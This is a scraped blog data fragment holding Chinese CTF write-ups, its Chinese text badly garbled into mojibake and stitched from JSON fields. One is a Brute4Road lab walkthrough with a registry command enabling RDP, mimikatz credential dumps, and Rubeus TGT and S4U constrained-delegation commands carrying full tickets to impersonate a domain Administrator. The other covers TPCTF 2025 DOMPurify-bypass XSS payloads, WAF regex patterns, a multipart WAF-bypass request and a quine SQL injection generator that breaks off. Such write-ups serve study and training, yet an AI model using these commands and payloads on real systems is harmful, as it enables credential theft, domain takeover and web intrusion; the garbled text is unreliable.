xrntkk /add\rREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u0026#34; \u0026#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f ä¿¡æ¯æ”¶é›†ä¸€ä¸‹\nå‘ç°è¿™å°æœºå­åœ¨åŸŸå†…\nç”¨bloodhoundåšä¸€ä¸‹ä¿¡æ¯æ”¶é›†\nchu0çš„å›¾ï¼Œå·è¿‡æ¥äº†![undefined (1)](../assets/undefined (1).png)\nä»å›¾ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒMSSQLSERVER å…·æœ‰å¯¹ DC çš„çº¦æŸæ€§å§”æ´¾æƒé™\næˆ‘ä»¬å¯ä»¥å°è¯•è¿›è¡Œçº¦æŸæ€§å§”æ´¾æ”»å‡»\nä»€ä¹ˆæ˜¯çº¦æŸæ€§å§”æ´¾ï¼Ÿ åŸç†å¤§è‡´å¦‚ä¸‹ï¼Œå‚è€ƒæ–‡ç« ï¼š\nhttps://xz.aliyun.com/news/13854\næ‰€ä»¥æˆ‘ä»¬æ¥ä¸‹æ¥å°±è¦å°è¯•ç”¨mimikatzæŠ“å–hashï¼Œç„¶åç”³è¯·TGTï¼Œæœ€åä¼ªé€ S4Uè¯·æ±‚è®¿é—®DC\nå…ˆä¼ ä¸€ä¸ªmimikatz.exeï¼Œç®¡ç†å‘˜æ‰“å¼€\nlog\rprivilege::Debug sekurlsa::logonpasswords exit æŠ“åˆ°ä¸€ä¸ªç”¨æˆ·hash\nAuthentication Id : 0 ; 95385 (00000000:00017499)\rSession : Service from 0\rUser Name : ReportServer\rDomain : NT Service\rLogon Server : (null)\rLogon Time : 2025/3/17 19:28:19\rSID : S-1-5-80-2885764129-887777008-271615777-1616004480-2722851051\rmsv :\t[00000003] Primary\r* Username : MSSQLSERVER$\r* Domain : XIAORANG\r* NTLM : 7e7c2b7d5cbee13683f637e721e4a147\r* SHA1 : d112e5ca3e3c502539058a39f153b432642aec96\rtspkg :\twdigest :\t* Username : MSSQLSERVER$\r* Domain : XIAORANG\r* Password : (null)\rkerberos :\t* Username : MSSQLSERVER$\r* Domain : xiaorang.lab\r* Password : 6c 8f 64 88 42 1e e5 dc ea 08 1f 03 05 9b e4 a5 50 70 b8 74 77 7b 50 b1 1e 80 d5 4b 0e 79 7c 9b b6 75 53 56 49 19 66 72 a9 d3 50 f8 d3 ab 0e bd e3 14 96 72 a5 fb b5 3f dc d9 ce 37 91 a2 5f d6 a1 2c 39 ea dc f3 80 e6 d2 cd c0 e6 f2 45 cd d1 80 aa f2 7f 47 09 44 ca 7d aa a0 10 c8 3c 5e e0 ae 71 77 f4 f3 1b 13 88 ab 39 68 37 41 43 e0 45 eb 6c 2d f6 fd 67 c6 ac 67 3e dd 56 71 48 b2 ed 7a f8 8c 4f d6 30 67 a2 32 8f 05 a0 2e 65 05 ce af 7d a6 c2 8e d9 c9 fc 31 6b 8e a1 7f 95 0a 2b 68 88 db 11 d9 9c f5 af 68 8c 0e ac 03 93 79 07 59 dd e6 da 42 2c 72 55 8d 3d 35 a9 85 49 90 3f 7b fb 7d b2 72 f7 76 7e ba c5 f0 98 77 fa 18 b2 b4 7c 65 d2 84 b7 8b e3 b2 fe bf 00 92 24 3b 9c b2 98 d3 5b 82 d4 d1 9f b5 aa c9 3b 54 33 26 34 ssp :\tcredman :\tå…ˆç”¨è¿™ä¸ªè´¦å·ç”³è¯·ä¸€ä¸ªTGT\nRubeus.exe asktgt /user:MSSQLSERVER$ /rc4:7e7c2b7d5cbee13683f637e721e4a147 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap \u0026gt; TGT.txt ç»“æœ\n______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___)\r| | \\ \\| |_| | |_) ) ____| |_| |___ |\r|_| |_|____/|____/|_____)____/(___/\rv2.3.2 [*] Action: Ask TGT\r[*] Using rc4_hmac hash: 7e7c2b7d5cbee13683f637e721e4a147\r[*] Building AS-REQ (w/ preauth) for: \u0026#39;xiaorang.lab\\MSSQLSERVER$\u0026#39;\r[*] Using domain controller: 172.22.2.3:88\r[+] TGT request successful!\r[*] base64(ticket.kirbi):\rdoIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE241tFjqrNfSoJoWlwylgM3bm183XnDyobdNuAnnh9mSDWS0SeH3+fwYgRMoAEPiDGuFo4fL+kul5qEbaYGfcl14J+SUaXE/f7JTn70xMBMfWdUS7ulBsLcLpx1xdDBgD6tvlkZAD0xrCljRUh2fYuS/5XslPN09EIOjbPDbUbeI5NOjmyFkc1kkkui9vQvTFcAn4LBWsjsmpajvNPYURpguJufgPgPcrDfsLcxdSGWoLeTdzasNYLXCdejYvH465Z56r3k6PbsBDKccsFzIeaTbaud4eHkDlW6O5xlNuQHIkNlp/THSzinnMkAh3T42u3UfxVS5cOyfgeRmkIlHTUFnrbu+Fd2h+pdawCrcedkPOyXR2nbX3iRcL1qul8TbQRInHDyBtr7LrELv+BDYlwWNHV5gB00MhCNXlTcZ6WPLBMoiMAb9LismX6i6wjgVIFpWOAt+Nn/13sz1PTC3akcG+x9GJ9I7iKH48KGNYS38B0KMyJEr402QAaYegGtv2W1vsTiumKxWCL2zOnLq3RLoFY1j72ugPYW1TgbaPrAOz8IWuWPyijEWCV4BxfzCMAHHxwvP3eJeBDRCueYvC85hJO7K5HseG6DOE0OCheBlZF0P7Zy+4su8XjOMPoK1QNcdnaBf/bGb5vci6Hm/sgEOzNtYuD+PjPNysyzge6TbGjCKW/zBCP3rZrkUL6HHby0/yP2KDXb4WZkTZmufLeEOeWYpuUS1j0zMXHIkv9aU7qhhUzznNo80Qq3bD4GSg0eh4JZTsLundidcOq8vbtv9AEfUxAp1yPCyAmB6NtfvACSZBSf7VYHtDQcta5t0DqVJ6h/gpX6uLCjwX0rITkCoUTbcR/+xavKHkWrLboa7XRKp4ZcinRy3kqCGd00qpgtryCduqhduQsMBlEOB7CeVBHTU/pjB/VpmNEWfSQSEx6SuVvf10a/tk9WKLHMukC+PGdEUp8JS3GvIMAmd3ZtC0SD0UXCZrDUhqdMs2ZjTNT4T+cBsdsdhEEt4cWq7Liktit+DR9DcJ0v6NNAQRHJA1htumPpNRsrn4YyEbjZwYuBxnJbH2rAqF1CwKsPOCtQIQhs90Fj9lz7v2ESjCXDxKm43qjwYiopWKy+4vqKNtzdcymFPme9HVPuFCnj/UwwYibvuXgwQZaNytazMd8N79wOVm3TK6TqblZUL9DaWMgBAAG5ORsUPFIaeM8XkuMwRPMX4cte7MuxK5TwOfNAOjWBBG1sIG1hit3eFXLkNWUuPLI5I2xh4YwFefKIY9p/8j3hQKga2CAU6bJDUYu3HNbHZyT9eQi1xi1KQbKUerFE+I5efaISQmVixkYGlSPIyQpGIFQdT8KeV84giD2Jefxty8Ik2W/8TGh8b2bn4bWJ1g8iMgzuurzbUEZjlf9mSWRdg8qU4PxsXcbf4Bk253/mclXVFCNojLz1RLVoj6TtJAIFw+IJG39dvcCjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBCCJ8Tx7azYeDfrUgOy2MJkoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI1MDMxNzE1MjQ1N1qmERgPMjAyNTAzMTgwMTI0NTdapxEYDzIwMjUwMzI0MTUyNDU3WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==\rServiceName : krbtgt/xiaorang.lab\rServiceRealm : XIAORANG.LAB\rUserName : MSSQLSERVER$ (NT_PRINCIPAL)\rUserRealm : XIAORANG.LAB\rStartTime : 2025/3/17 23:24:57\rEndTime : 2025/3/18 9:24:57\rRenewTill : 2025/3/24 23:24:57\rFlags : name_canonicalize, pre_authent, initial, renewable, forwardable\rKeyType : rc4_hmac\rBase64(key) : gifE8e2s2Hg361IDstjCZA==\rASREP (key) : 7E7C2B7D5CBEE13683F637E721E4A147 å¾—åˆ°base64ç¼–ç çš„TGTç¥¨æ®ï¼Œåˆ©ç”¨Rubeuså¯¼å…¥ç¥¨æ®\nRubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE241tFjqrNfSoJoWlwylgM3bm183XnDyobdNuAnnh9mSDWS0SeH3+fwYgRMoAEPiDGuFo4fL+kul5qEbaYGfcl14J+SUaXE/f7JTn70xMBMfWdUS7ulBsLcLpx1xdDBgD6tvlkZAD0xrCljRUh2fYuS/5XslPN09EIOjbPDbUbeI5NOjmyFkc1kkkui9vQvTFcAn4LBWsjsmpajvNPYURpguJufgPgPcrDfsLcxdSGWoLeTdzasNYLXCdejYvH465Z56r3k6PbsBDKccsFzIeaTbaud4eHkDlW6O5xlNuQHIkNlp/THSzinnMkAh3T42u3UfxVS5cOyfgeRmkIlHTUFnrbu+Fd2h+pdawCrcedkPOyXR2nbX3iRcL1qul8TbQRInHDyBtr7LrELv+BDYlwWNHV5gB00MhCNXlTcZ6WPLBMoiMAb9LismX6i6wjgVIFpWOAt+Nn/13sz1PTC3akcG+x9GJ9I7iKH48KGNYS38B0KMyJEr402QAaYegGtv2W1vsTiumKxWCL2zOnLq3RLoFY1j72ugPYW1TgbaPrAOz8IWuWPyijEWCV4BxfzCMAHHxwvP3eJeBDRCueYvC85hJO7K5HseG6DOE0OCheBlZF0P7Zy+4su8XjOMPoK1QNcdnaBf/bGb5vci6Hm/sgEOzNtYuD+PjPNysyzge6TbGjCKW/zBCP3rZrkUL6HHby0/yP2KDXb4WZkTZmufLeEOeWYpuUS1j0zMXHIkv9aU7qhhUzznNo80Qq3bD4GSg0eh4JZTsLundidcOq8vbtv9AEfUxAp1yPCyAmB6NtfvACSZBSf7VYHtDQcta5t0DqVJ6h/gpX6uLCjwX0rITkCoUTbcR/+xavKHkWrLboa7XRKp4ZcinRy3kqCGd00qpgtryCduqhduQsMBlEOB7CeVBHTU/pjB/VpmNEWfSQSEx6SuVvf10a/tk9WKLHMukC+PGdEUp8JS3GvIMAmd3ZtC0SD0UXCZrDUhqdMs2ZjTNT4T+cBsdsdhEEt4cWq7Liktit+DR9DcJ0v6NNAQRHJA1htumPpNRsrn4YyEbjZwYuBxnJbH2rAqF1CwKsPOCtQIQhs90Fj9lz7v2ESjCXDxKm43qjwYiopWKy+4vqKNtzdcymFPme9HVPuFCnj/UwwYibvuXgwQZaNytazMd8N79wOVm3TK6TqblZUL9DaWMgBAAG5ORsUPFIaeM8XkuMwRPMX4cte7MuxK5TwOfNAOjWBBG1sIG1hit3eFXLkNWUuPLI5I2xh4YwFefKIY9p/8j3hQKga2CAU6bJDUYu3HNbHZyT9eQi1xi1KQbKUerFE+I5efaISQmVixkYGlSPIyQpGIFQdT8KeV84giD2Jefxty8Ik2W/8TGh8b2bn4bWJ1g8iMgzuurzbUEZjlf9mSWRdg8qU4PxsXcbf4Bk253/mclXVFCNojLz1RLVoj6TtJAIFw+IJG39dvcCjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBCCJ8Tx7azYeDfrUgOy2MJkoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI1MDMxNzE1MjQ1N1qmERgPMjAyNTAzMTgwMTI0NTdapxEYDzIwMjUwMzI0MTUyNDU3WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg== æ¥ä¸‹æ¥å°±å¯ä»¥å’ŒDCè¿›è¡Œé€šè®¯äº†\nWIN+R\r\\\\DC.xiaorang.lab\\C$\\Users\\Administrator\\flag\\ æˆ–è€…\ntype \\\\DC.xiaorang.lab\\C$\\Users\\Administrator\\flag\\flag04.txt ######: ### ######: ##\r####### ## :### ####### ##\r## :## ## .#### ## :## ##\r## ## ##.#### ## ## ####### .####: ##.## ## ## .####. :#### :###.##\r## :## ####### ## ## ####### .######: :#: ## ## :## .######. ###### :#######\r#######. ###. ## ## ## ##: :## .## ## #######: ### ### #: :## ### ###\r#######. ## ## ## ## ######## ## ## ###### ##. .## :##### ##. .##\r## :## ## ## ## ## ######## ######## ## ##. ## ## .####### ## ##\r## ## ## ## ## ## ## ######## ## ## ##. .## ## . ## ##. .##\r## :## ## ##: ### ##. ###. :# ## ## :## ### ### ##: ### ### ###\r######## ## ####### ##### .####### ## ## ##: .######. ######## :#######\r###### ## ###.## .#### .#####: ## ## ### .####. ###.## :###.##\rWell done hacking!\rThis is the final flag, you deserve it!\rflag04: flag{1c3cf693-f2fc-4f35-aece-789e66f56ecc} ","permalink":"http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-brute4road-writeup/","summary":"\u003cp\u003eå‚è€ƒæ–‡ç« \u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://bowuchuling.github.io/posts/chunqiuBrute4Road.html\"\u003ehttps://bowuchuling.github.io/posts/chunqiuBrute4Road.html\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://h0ny.github.io/posts/Brute4Road-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83\"\u003ehttps://h0ny.github.io/posts/Brute4Road-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://xz.aliyun.com/news/12189#toc-6\"\u003eæ–‡ç«  - æµ…è°ˆçº¦æŸå§”æ´¾æ”»å‡» - å…ˆçŸ¥ç¤¾åŒº\u003c/a\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch3 id=\"flag1\"\u003eFLAG1\u003c/h3\u003e\n\u003cp\u003eæ‹¿åˆ°é¶æœºå…ˆç”¨fscanæ‰«ä¸€æ‰«\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\r\nâ”‚    ___                              _        â”‚\r\nâ”‚   / _ \\     ___  ___ _ __ __ _  ___| | __    â”‚\r\nâ”‚  / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ /    â”‚\r\nâ”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   \u0026lt;     â”‚\r\nâ”‚ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    â”‚\r\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\r\n      Fscan Version: 2.0.0\r\n\r\n[2025-03-17 14:12:55] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1\r\n[2025-03-17 14:12:55] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ\r\n[2025-03-17 14:12:55] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 1\r\n[2025-03-17 14:12:55] [INFO] å¼€å§‹ä¸»æœºæ‰«æ\r\n[2025-03-17 14:12:55] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233\r\n[2025-03-17 14:12:55] [SUCCESS] ç«¯å£å¼€æ”¾ 39.98.114.207:80\r\n[2025-03-17 14:12:55] [SUCCESS] ç«¯å£å¼€æ”¾ 39.98.114.207:22\r\n[2025-03-17 14:12:55] [SUCCESS] ç«¯å£å¼€æ”¾ 39.98.114.207:6379\r\n[2025-03-17 14:12:55] [SUCCESS] ç«¯å£å¼€æ”¾ 39.98.114.207:21\r\n[2025-03-17 14:12:55] [SUCCESS] æœåŠ¡è¯†åˆ« 39.98.114.207:22 =\u0026gt; [ssh] ç‰ˆæœ¬:7.4 äº§å“:OpenSSH ä¿¡æ¯:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.]\r\n[2025-03-17 14:12:55] [SUCCESS] æœåŠ¡è¯†åˆ« 39.98.114.207:21 =\u0026gt; [ftp] ç‰ˆæœ¬:3.0.2 äº§å“:vsftpd ç³»ç»Ÿ:Unix Banner:[220 (vsFTPd 3.0.2).]\r\n[2025-03-17 14:13:00] [SUCCESS] æœåŠ¡è¯†åˆ« 39.98.114.207:80 =\u0026gt; [http] ç‰ˆæœ¬:1.20.1 äº§å“:nginx\r\n[2025-03-17 14:13:00] [SUCCESS] æœåŠ¡è¯†åˆ« 39.98.114.207:6379 =\u0026gt; [redis] ç‰ˆæœ¬:5.0.12 äº§å“:Redis key-value store\r\n[2025-03-17 14:13:06] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 4\r\n[2025-03-17 14:13:06] [INFO] å¼€å§‹æ¼æ´æ‰«æ\r\n[2025-03-17 14:13:06] [INFO] åŠ è½½çš„æ’ä»¶: ftp, redis, ssh, webpoc, webtitle\r\n[2025-03-17 14:13:06] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://39.98.114.207      çŠ¶æ€ç :200 é•¿åº¦:4833   æ ‡é¢˜:Welcome to CentOS\r\n[2025-03-17 14:13:07] [SUCCESS] åŒ¿åç™»å½•æˆåŠŸ!\r\n[2025-03-17 14:13:09] [SUCCESS] Redis 39.98.114.207:6379 å‘ç°æœªæˆæƒè®¿é—® æ–‡ä»¶ä½ç½®:/usr/local/redis/db/dump.rdb\r\n[2025-03-17 14:13:13] [SUCCESS] Redisæ— å¯†ç è¿æ¥æˆåŠŸ: 39.98.114.207:6379\r\n[2025-03-17 14:13:18] [SUCCESS] æ‰«æå·²å®Œæˆ: 5/5\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eå‘ç°redisä¸éœ€è¦å¯†ç \u003c/p\u003e","title":"æ˜¥ç§‹äº‘é•œ-Brute4Road-Writeup"},{"content":" å‚è€ƒæ–‡ç« \nhttps://blog.0xfff.team/posts/tpctf_2025_writeup/\nhttps://z3n1th1.com/2025/03/tpctf2025-writeup/\nTPCTF2025 Writeup - æ˜Ÿç›Ÿå®‰å…¨å›¢é˜Ÿ\nbaby layout è¿™æ˜¯ä¸€é“å…³äºç»•è¿‡DOMPurifyåº“ï¼Œè¿›è¡Œxss cookieçªƒå–çš„é¢˜ç›®\nDOMPurify æ˜¯ä¸€ä¸ªä¸“é—¨ç”¨äºæ¸…ç† HTML è¾“å…¥çš„ JavaScript åº“ï¼Œæ—¨åœ¨é˜²æ­¢è·¨ç«™è„šæœ¬ (XSS) æ”»å‡»ã€‚å®ƒé€šè¿‡è¿‡æ»¤å’Œå‡€åŒ–ç”¨æˆ·æä¾›çš„ HTML å†…å®¹ï¼Œç¡®ä¿å…¶å®‰å…¨åœ°åµŒå…¥åˆ°ç½‘é¡µä¸­ï¼Œé¿å…æ¶æ„ä»£ç çš„æ‰§è¡Œã€‚\nåœ¨è¿™é“é¢˜ä¸­è°ƒç”¨äº†DOMPurifyåº“å¯¹content è¿›è¡Œ HTML å†…å®¹çš„å‡€åŒ–ï¼Œä»¥é˜²æ­¢ XSS æ”»å‡»ï¼Œè€Œä¸”å°†å‡€åŒ–åçš„å†…å®¹æ›¿æ¢åˆ° layout å­—ç¬¦ä¸²ä¸­ç‰¹å®šçš„å ä½ç¬¦ {{content}} å¤„\nå¦å¤–åœ¨ä¸‹è¾¹çš„åˆ›å»ºLayoutå¤„ä¹Ÿä¼šè°ƒç”¨DOMPurifyåº“çš„sanitize\nsanitizeçš„å·¥ä½œåŸç†å¤§è‡´å¦‚ä¸‹\né‚£æ—¢ç„¶è¿™ä¸¤è¾¹éƒ½è¢«è¿›è¡Œäº†å†…å®¹çš„å‡€åŒ–ï¼Œéš¾ä»¥ç›´æ¥è¿›è¡Œxssï¼Œé‚£æˆ‘ä»¬æ˜¯å¦å¯ä»¥é€šè¿‡ä¸¤è€…ç»“åˆçš„æ–¹å¼è¿›è¡Œxsså‘¢\nå…ˆå°è¯•ä¸€ä¸‹è¿™ä¸ª\nlayoutï¼š\r\u0026lt;img src onerror=\u0026#34;{{content}}\u0026#34;\u0026gt;\rcontentï¼š\ralert(1) å‘ç°ä¸è¡Œï¼Œå› ä¸ºå½“ä¼ å…¥çš„å†…å®¹ä¸ºhtmlçš„æ—¶å€™DOMPurifyä¼šå¯¹å…¶ä¸­çš„å…ƒç´ è¿›è¡Œè§£æï¼Œå…¶ä¸­onerrorä¸ºå±é™©å±æ€§æ‰€æœ‰è¢«å‡€åŒ–æ‰äº†\næ‰€ä»¥layoutå˜æˆäº†\n\u0026lt;img src=1 \u0026gt; ä½†æ˜¯å¦‚æœæˆ‘ä»¬ä¼ å…¥çš„å†…å®¹ä¸ä¸ºhtmlç»“æ„çš„æ—¶å€™ï¼ŒDOMPurifyæ— æ³•å¯¹å…ƒç´ è¿›è¡Œè§£æå’Œå‡€åŒ–ï¼Œæ˜¯å¯ä»¥æ­£å¸¸ä¼ å…¥onerrorçš„\næ‰€ä»¥å¯ä»¥è¿™æ ·æ„é€ payload\nlayoutï¼š\r\u0026lt;img src=\u0026#34;{{content}}\u0026#34;\u0026gt;\rcontentï¼š\r1\u0026#34; onerror=\u0026#34;alert(1) safe-layout è¿™é¢˜å’Œä¸Šä¸€é¢˜çš„åŒºåˆ«æ˜¯å¢åŠ äº†ALLOWED_ATTR: []\nconst sanitizedContent = DOMPurify.sanitize(content, { ALLOWED_ATTR: [] }); ä¸€ä¸ªç±»ä¼¼ç™½åå•çš„ä¸œè¥¿ã€‚\nä½†æ˜¯è¿™ç©æ„å…¶å®å¹¶ä¸æ˜¯ç™½åå•ï¼Œè™½ç„¶è¯´ç¦ç”¨äº†æ‰€æœ‰çš„å±æ€§ï¼Œä½†æ˜¯data-*å’Œaira-*å±æ€§è¿˜æ˜¯å¯ä»¥æ­£å¸¸ä½¿ç”¨çš„\nè¿™ç¯‡æ–‡ç« ä¸­æœ‰æåˆ°ï¼š\nhttps://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#dangerous-allow-lists\næ‰€ä»¥å¯ä»¥æ„é€ å‡ºpayload\ncontent\n123\u0026#34; onload=\u0026#34;alert(1) layout\n\u0026lt;svg data-type=\u0026#34;{{content}}\u0026#34;\u0026gt;\u0026lt;/svg\u0026gt; æˆ–è€…æ˜¯\nlayout\n\u0026lt;svg aria-hidden=\u0026#34;{{content}}\u0026#34;\u0026gt;\u0026lt;/svg\u0026gt; safe layout revenge è¿™é¢˜æŠŠä¸Šé¢˜ä¸­ä½¿ç”¨çš„aria-*å’Œdata-*ç»™banæ‰äº†\nè¿˜æ˜¯çœ‹ä¸Šé¢˜ä¸­çš„é‚£ç¯‡æ–‡ç« \nhttps://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#cve-2023-48219-tinymce\nåœ¨è¿™ç¯‡æ–‡ç« ä¸­æåˆ°çš„CVE-2023-48219ä¸­ï¼Œä¼šåœ¨DOMpurifyåå°†\\uFFFFæ›¿æ¢ä¸ºç©ºã€‚\næ‰€ä»¥è¿™é‡Œå¯ä»¥åˆ©ç”¨\\uFEFFå¯¹htmlä»£ç è¿›è¡Œæˆªæ–­ï¼Œä»è€Œç»•è¿‡DOMpurify\nå›åˆ°è¿™é“é¢˜ï¼Œæˆ‘ä»¬è¿™é‡Œä¹Ÿå¯ä»¥è¾¾åˆ°ç±»ä¼¼çš„æ•ˆæœã€‚æˆ‘ä»¬å¯ä»¥ç”¨{{content}}æ¥ä»£æ›¿\\uFEFFå¯¹htmlè¿›è¡Œæˆªæ–­ã€‚\næ‰€ä»¥payloadå°±æ˜¯\n//contentä¸ºç©º\rlayoutï¼š\rx\u0026lt;style\u0026gt;\u0026lt;{{content}}/style\u0026gt;\u0026lt;{{content}}img src=x onerror=alert(123)\u0026gt;\u0026lt;/style\u0026gt; supersqli è€ƒç‚¹ï¼šè§£æå·®å¼‚ç»•è¿‡å’Œquineæ³¨å…¥\næ‹¿åˆ°é™„ä»¶\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™é“é¢˜ç”¨goå®ç°äº†ä¸€ä¸ªåå‘ä»£ç†å’ŒWAF\n1var sqlInjectionPattern = regexp.MustCompile(`(?i)(union.*select|select.*from|insert.*into|update.*set|delete.*from|drop\\s+table|--|#|\\*\\/|\\/\\*)`) 2 3var rcePattern = regexp.MustCompile(`(?i)(\\b(?:os|exec|system|eval|passthru|shell_exec|phpinfo|popen|proc_open|pcntl_exec|assert)\\s*\\(.+\\))`) 4 5var hotfixPattern = regexp.MustCompile(`(?i)(select)`) 6 7var blockedUserAgents = []string{ 8\t\u0026#34;sqlmap\u0026#34;, 9\t\u0026#34;nmap\u0026#34;, 10\t\u0026#34;curl\u0026#34;, 11} å†çœ‹åˆ°urls.py\n1from django.contrib import admin 2from django.urls import path 3from blog import views 4 5urlpatterns = [ 6 path(\u0026#34;flag/\u0026#34;, views.flag, name=\u0026#34;flag\u0026#34;), 7 path(\u0026#34;\u0026#34;, views.index, name=\u0026#34;index\u0026#34;), 8] å®šä¹‰äº†ä¸€ä¸ªflagè·¯ç”±ï¼ŒæŒ‡å‘views.pyçš„flagå‡½æ•°\nè·Ÿè¿›views\n1from django.shortcuts import render 2from django.db import connection 3 4# Create your views here. 5from django.http import HttpResponse,HttpRequest 6from .models import AdminUser,Blog 7import os 8 9def index(request:HttpRequest): 10 return HttpResponse(\u0026#39;Welcome to TPCTF 2025\u0026#39;) 11 12def flag(request:HttpRequest): 13 if request.method != \u0026#39;POST\u0026#39;: 14 return HttpResponse(\u0026#39;Welcome to TPCTF 2025\u0026#39;) 15 username = request.POST.get(\u0026#39;username\u0026#39;) 16 if username != \u0026#39;admin\u0026#39;: 17 return HttpResponse(\u0026#39;you are not admin.\u0026#39;) 18 password = request.POST.get(\u0026#39;password\u0026#39;) 19 users:AdminUser = AdminUser.objects.raw(\u0026#34;SELECT * FROM blog_adminuser WHERE username=\u0026#39;%s\u0026#39; and password =\u0026#39;%s\u0026#39;\u0026#34; % (username,password)) 20 try: 21 assert password == users[0].password 22 return HttpResponse(os.environ.get(\u0026#39;FLAG\u0026#39;)) 23 except: 24 return HttpResponse(\u0026#39;wrong password\u0026#39;) è¿™é‡Œå­˜åœ¨sqlæ³¨å…¥\næ‰€ä»¥æ¥ä¸‹æ¥çš„ç›®æ ‡å°±æ˜¯è¦æƒ³åŠæ³•ç»•è¿‡wafï¼Œè¿›è¡Œsqlæ³¨å…¥\nå¯ä»¥åˆ©ç”¨multipart boundaryæ¥ç»•è¿‡wafï¼Œå‚è€ƒä¸‹é¢çš„è¿™ç¯‡æ–‡ç« \nhttps://www.geekby.site/2022/03/waf-bypass/#multipart-%E6%B7%B7%E6%B7%86\n1POST /flag/ HTTP/1.1 2Host: 127.0.0.1:7788 3sec-ch-ua-mobile: ?0 4Sec-Fetch-Site: cross-site 5Upgrade-Insecure-Requests: 1 6Sec-Fetch-Dest: document 7sec-ch-ua-platform: \u0026#34;Windows\u0026#34; 8sec-ch-ua: \u0026#34;Chromium\u0026#34;;v=\u0026#34;134\u0026#34;, \u0026#34;Not:A-Brand\u0026#34;;v=\u0026#34;24\u0026#34;, \u0026#34;Google Chrome\u0026#34;;v=\u0026#34;134\u0026#34; 9Referer: http://mitm/ 10Sec-Fetch-Mode: navigate 11Sec-Fetch-User: ?1 12Accept-Language: zh-CN,zh;q=0.9 13User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 14Accept-Encoding: gzip, deflate, br, zstd 15Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 16Content-Type: multipart/form-data; boundary=a 17 18--a 19Content-Disposition: form-data; name=\u0026#34;username\u0026#34; 20 21admin 22--a 23Content-Disposition: form-data; name=\u0026#34;password\u0026#34;;filename=\u0026#34;password\u0026#34; 24Content-Disposition: form-data; name=\u0026#34;password\u0026#34;; 25 26123 27--a-- è¿™é¢˜æˆ‘ä»¬å¯ä»¥ä½¿ç”¨quineæ³¨å…¥ï¼Œå³æ„é€ sqlè¯­å¥ä½¿æˆ‘ä»¬è¾“å…¥å’Œè¾“å‡ºçš„ç»“æœä¸€è‡´ï¼Œä»è€Œç»•è¿‡\n1assert password == users[0].password å‚è€ƒæ–‡ç« ï¼š\nhttps://www.cnblogs.com/meraklbz/p/18169584\nç”Ÿæˆä¸€ä¸ªpayload\n1def quine(data, debug=True): 2 if debug: 3 print(data) 4 data = data.replace(\u0026#39;$$\u0026#39;,\u0026#34;REPLACE(REPLACE($$,CHAR(34),CHAR(39)),CHAR(36),$$)\u0026#34;) 5 blob = 